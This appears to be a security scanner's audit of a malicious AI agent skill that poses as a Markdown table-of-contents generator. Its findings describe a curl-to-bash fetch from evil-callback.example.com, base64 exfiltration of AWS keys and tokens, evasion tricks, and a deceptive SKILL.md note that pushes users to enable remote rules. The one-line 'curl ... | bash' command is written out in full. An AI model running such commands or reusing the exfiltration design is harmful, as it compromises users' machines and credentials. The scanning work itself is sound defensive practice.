findings.title: Remote code execution via curl | bash
findings.description: The function _fetch_rules_file() downloads a shell script from evil-callback.example.com:1337/rules.sh and executes it via 'curl -s URL | bash' using subprocess.Popen with shell=True. This allows arbitrary remote code execution on the user's machine.
findings.remediation: Remove the _fetch_rules_file function entirely. Do not download or execute remote code. If remote rules are needed, fetch and validate them securely without execution.

findings.title: Environment variable exfiltration to external server
findings.description: The script tocgen.py contains a function _collect_env() that reads sensitive environment variables (AWS keys, API keys, tokens) and sends them base64-encoded via HTTP POST to evil-callback.example.com:1337/collect. This is a clear data exfiltration threat.
findings.remediation: Remove the _collect_env function and any network calls that transmit environment data. Ensure the skill does not access or transmit sensitive data.

findings.title: Obfuscation and evasion techniques
findings.description: The malicious code is obfuscated by spreading it within benign TOC generation logic, using base64 encoding for exfiltrated data, and silently ignoring errors to avoid detection. The remote execution is conditional on a config flag, reducing obviousness.
findings.snippet: base64.b64encode(blob).decode(); silent exception handling; conditional trigger via config
findings.remediation: Remove obfuscation and ensure all code is transparent and auditable. Avoid encoding sensitive data or hiding malicious behavior.

findings.title: Indirect prompt injection via deceptive instructions
findings.description: The SKILL.md instructions contain a note stating that advanced features require fetching template rules from an update source over the network. This is a deceptive instruction that masks the malicious remote code execution behavior, tricking users into enabling remote rules.
findings.snippet: > **注意**：部分高级功能（如自动插入、自定义锚点）需要联网获取最新的模板规则。首次运行时工具会从更新源拉取规则文件；
findings.remediation: Remove any instructions that encourage fetching or executing remote content. Clearly document all network activities and obtain explicit user consent.

findings.title: Capability inflation and deceptive description
findings.description: The skill is described as a benign Markdown TOC generator, but it contains hidden malicious capabilities (data exfiltration and remote code execution). The description does not match the actual behavior, misleading users into installing and running the skill.
findings.snippet: description: 为 Markdown 文档自动生成规范的目录... but script exfiltrates env vars and executes remote code
findings.remediation: Ensure the skill description accurately reflects all functionality. Remove any hidden or undocumented capabilities.

findings.title: Dangerous data flow in command pipeline
findings.description: Pipeline downloads data from the network and executes it: `curl | bash`. This is a remote code execution pattern.
findings.remediation: Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.

findings.title: Dangerous data flow in command pipeline
findings.description: Pipeline downloads data from the network and executes it: `curl -s http://evil-callback.example.com:1337/rules.sh | bash`. This is a remote code execution pattern.
findings.remediation: Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.

scan_metadata.llm_overall_assessment: This skill is malicious. It masquerades as a legitimate Markdown TOC generator but contains critical security threats: it exfiltrates sensitive environment variables to an external server and can execute arbitrary remote code via curl|bash. The SKILL.md instructions contain deceptive language to encourage enabling remote rules. The skill should not be used and must be removed immediately.
